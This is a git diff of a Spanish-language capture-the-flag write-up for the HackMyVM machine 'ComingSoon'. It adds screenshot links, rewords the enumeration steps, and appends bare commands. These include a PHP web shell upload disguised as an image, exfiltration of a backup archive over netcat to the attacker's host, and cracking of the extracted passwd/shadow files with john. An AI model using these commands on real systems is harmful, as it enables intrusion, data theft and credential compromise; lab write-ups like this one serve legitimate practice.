@@ -1,5 +1,5 @@
 
-![image]()
+![image](https://github.com/x4nderht/CTFs/blob/7475e71418d1d894c16c0ab7cef09335f994551e/HackMeVM/ComingSoon/imgs/comingsoon-banner.png)
 
 [Maquina](https://hackmyvm.eu/machines/machine.php?vm=Comingsoon)   \   [HackMeVM](https://hackmyvm.eu/)
 
@@ -62,11 +62,11 @@ PORT   STATE SERVICE VERSION
 
 ```
 Nmap no nos reporta mucha informacion relevante por lo que abriremos nuestro navegador y colocaremos la *IP* de la maquina vulnerable para poder visualizar la pagina web que corre dentro de la maquina y buscar posibles vectores de ataque.
-![image]()
+![image](https://github.com/x4nderht/CTFs/blob/7475e71418d1d894c16c0ab7cef09335f994551e/HackMeVM/ComingSoon/imgs/comingsoon-1.png)
 
 Dentro de la web y en su codigo no encontramos nada interesante.
 
-Usamos `whatweb` para determinar las tecnologias y sus versiones que son usadas en la pagina web y poder determinar si alguna de estas desactualizada y si contiene alguna vulnerabilidad conocida.
+Usamos `whatweb` para ver las tecnologias y las versiones de estas que son usadas en la pagina web y poder determinar si alguna de estas se encuentra desactualizada y si contiene alguna vulnerabilidad conocida.
 ```shell
 whatweb 10.10.10.6
 ____________________________________
@@ -75,7 +75,7 @@ http://10.10.10.6 [200 OK] Apache[2.4.51], Bootstrap, Cookies[RW5hYmxlVXBsb2FkZX
 ```
 Con `whatweb` tampoco nos encontramos con algo interesante asi que haremos uso de `gobuster` para buscar directorios y archivos que se encuentran alojadas en el mismo servidor *http*.
 
-A `gobuster`, con el parametro `-x` le indicamos que extensiones de archivos deceamos comprobar su existencia usando del mismo diccionario que se usara para descubrir los posibles directorios dentro del servidor indicado por el parametro `-w`, y con `--url` le indicamos la direccion de la pagina web.
+Con el parametro `-x` le indicamos a `gobuster` que tipo de extensiones de archivos deceamos comprobar su existencia usando del mismo diccionario que se usara para descubrir los posibles directorios, indicado por el parametro `-w`, y con `--url` le indicamos la direccion de la pagina web.
 ```shell
  gobuster dir --url http://10.10.10.6 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x xml,txt,php,html
 ____________________________________________________________________________________________________
@@ -92,11 +92,59 @@ Starting gobuster in directory enumeration mode
 ...
 ```
 
+```shell
+echo "<?php system(\$_GET['cmd']); ?>" >> image.php
+```
 
+```shell
+mv image.php image.phtml
+```
 
+```shell
+find / -name backups\*
+```
 
+```shell
+find / -name backups\* 2>/dev/null
+```
 
+```shell
+nc 10.10.10.4 < backup.tar.gz
+```
 
+```shell
+nc -nlvp 444 > backup.tar.gz
+```
+
+```shell
+tar -xvzf backup.tar.gz
+```
+
+```shell
+unshadow passwd shadow > ./unshadow
+```
+
+```shell
+john --wordlist=/usr/share/wordlists/rockyou.txt ./unshadow --format=crypt
+```
+
+```shell
+curl -O https://raw.githubusercontent.com/therealtomkraz/ctfscripts/main/top_100_animated_movies.txt
+```
+```shell
+curl -O https://raw.githubusercontent.com/therealtomkraz/ctfscripts/main/verifysuroot.py
+```
+
+```shell
+python3 -m http.server
+```
+
+```shell
+curl -O http://10.10.10.4:8000/top_ten_animated_movies.txt
+```
+```shell
+curl -O http://10.10.10.4:8000/verifysuroot.py
+```
 
 
 
